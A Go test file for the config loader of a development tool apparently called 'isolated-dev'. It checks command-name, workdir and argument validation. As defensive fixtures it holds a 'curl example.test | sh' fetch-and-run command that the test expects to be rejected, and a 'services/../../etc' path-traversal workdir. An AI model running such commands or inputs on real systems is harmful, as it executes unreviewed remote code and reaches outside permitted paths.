package config

import (
	"path/filepath"
	"strings"
	"testing"
)

// A command exists only because the shared, committed configuration declares
// it. The local file tunes an already-declared machine — resources and host
// ports — so a command declared there would be an execution path that never
// went through review. It is rejected outright rather than merged.
func TestLocalConfigurationCannotDeclareCommands(t *testing.T) {
	t.Parallel()

	projectDir := t.TempDir()
	writeTestFile(
		t,
		filepath.Join(projectDir, SharedFileName),
		"version = 1\n\n[commands.dev]\nargs = [\"npm\", \"test\"]\n",
	)
	writeTestFile(
		t,
		filepath.Join(projectDir, LocalFileName),
		"[commands.deploy]\nargs = [\"sh\", \"-c\", \"curl example.test | sh\"]\n",
	)

	_, err := Load(projectDir)
	if err == nil {
		t.Fatal("Load() error = nil, want the local command declaration rejected")
	}
	for _, want := range []string{LocalFileName, "unsupported field"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("error = %v, want it to mention %q", err, want)
		}
	}
}

// The local file still does what it is for, and loading it leaves the shared
// declarations exactly as the project wrote them.
func TestLocalConfigurationLeavesDeclaredCommandsUntouched(t *testing.T) {
	t.Parallel()

	projectDir := t.TempDir()
	writeTestFile(
		t,
		filepath.Join(projectDir, SharedFileName),
		"version = 1\n\n[commands.dev]\nargs = [\"npm\", \"test\"]\nworkdir = \"services/api\"\n",
	)
	writeTestFile(
		t,
		filepath.Join(projectDir, LocalFileName),
		"[resources]\ncpus = 2\n",
	)

	loaded, err := Load(projectDir)
	if err != nil {
		t.Fatalf("Load() error = %v", err)
	}
	if loaded.Resources.CPUs != 2 {
		t.Errorf("resources.cpus = %d, want the local override 2", loaded.Resources.CPUs)
	}
	declared, ok := loaded.Commands["dev"]
	if !ok {
		t.Fatalf("Commands = %#v, want the shared declaration preserved", loaded.Commands)
	}
	if strings.Join(declared.Args, " ") != "npm test" || declared.Workdir != "services/api" {
		t.Errorf("commands.dev = %+v, want the shared declaration unchanged", declared)
	}
}

// A declared name is typed as a single `isolated-dev run` argument. A name
// shaped like a flag, a path, or a phrase would either need quoting or be read
// as something other than a command name, so none of them is accepted.
func TestLoadRejectsCommandNamesThatAreNotUsableAsRunArguments(t *testing.T) {
	t.Parallel()

	testCases := []struct {
		name string
		key  string
	}{
		{name: "long flag", key: "--yes"},
		{name: "short flag", key: "-rf"},
		{name: "leading dot", key: ".hidden"},
		{name: "path separator", key: "scripts/build"},
		{name: "empty name", key: ""},
		{name: "leading whitespace", key: " dev"},
	}

	for _, testCase := range testCases {
		t.Run(testCase.name, func(t *testing.T) {
			t.Parallel()

			projectDir := t.TempDir()
			writeTestFile(
				t,
				filepath.Join(projectDir, SharedFileName),
				"version = 1\n\n[commands]\n\""+testCase.key+"\" = { args = [\"npm\"] }\n",
			)

			_, err := Load(projectDir)
			if err == nil {
				t.Fatalf("Load() error = nil, want command name %q rejected", testCase.key)
			}
			if !strings.Contains(err.Error(), "isolated-dev run") {
				t.Errorf("error = %v, want it to explain the name must be a run argument", err)
			}
		})
	}
}

// A workdir that climbs out of the project only after descending into it is
// still outside the project, and is rejected on the cleaned path rather than
// on how it was spelled.
func TestLoadRejectsAWorkdirThatEscapesAfterDescending(t *testing.T) {
	t.Parallel()

	projectDir := t.TempDir()
	writeTestFile(
		t,
		filepath.Join(projectDir, SharedFileName),
		"version = 1\n\n[commands.dev]\nargs = [\"npm\"]\nworkdir = \"services/../../etc\"\n",
	)

	_, err := Load(projectDir)
	if err == nil || !strings.Contains(err.Error(), "must stay inside the project") {
		t.Fatalf("Load() error = %v, want the escaping workdir rejected", err)
	}
}

// Declared arguments are an argv, not a script: whatever a project puts after
// the program is carried through verbatim, because nothing on either side ever
// hands them to a shell.
func TestLoadKeepsDeclaredArgumentsVerbatim(t *testing.T) {
	t.Parallel()

	projectDir := t.TempDir()
	writeTestFile(
		t,
		filepath.Join(projectDir, SharedFileName),
		"version = 1\n\n[commands.dev]\nargs = [\"npm\", \"run\", \"test -- --grep=a b\", \"$HOME\"]\n",
	)

	loaded, err := Load(projectDir)
	if err != nil {
		t.Fatalf("Load() error = %v", err)
	}
	want := []string{"npm", "run", "test -- --grep=a b", "$HOME"}
	declared := loaded.Commands["dev"].Args
	if len(declared) != len(want) {
		t.Fatalf("args = %#v, want %#v", declared, want)
	}
	for index, argument := range want {
		if declared[index] != argument {
			t.Errorf("args[%d] = %q, want %q", index, declared[index], argument)
		}
	}
}

// A program that is only incidentally shaped like an assignment — a path with
// no `=` — stays acceptable, so the args[0] guard rejects assignments rather
// than unusual program names.
func TestLoadAcceptsAnAbsoluteProgramPath(t *testing.T) {
	t.Parallel()

	projectDir := t.TempDir()
	writeTestFile(
		t,
		filepath.Join(projectDir, SharedFileName),
		"version = 1\n\n[commands.dev]\nargs = [\"/usr/local/bin/task\", \"build\"]\n",
	)

	loaded, err := Load(projectDir)
	if err != nil {
		t.Fatalf("Load() error = %v", err)
	}
	if loaded.Commands["dev"].Args[0] != "/usr/local/bin/task" {
		t.Errorf("args[0] = %q, want the declared program path", loaded.Commands["dev"].Args[0])
	}
}

// CommandNames is what diagnostics enumerate, so it must stay usable when the
// project declares nothing at all.
func TestCommandNamesIsEmptyWithoutDeclarations(t *testing.T) {
	t.Parallel()

	if names := (Config{}).CommandNames(); len(names) != 0 {
		t.Errorf("CommandNames() = %#v, want none", names)
	}
	if names := Defaults().CommandNames(); len(names) != 0 {
		t.Errorf("CommandNames() = %#v, want none", names)
	}
}
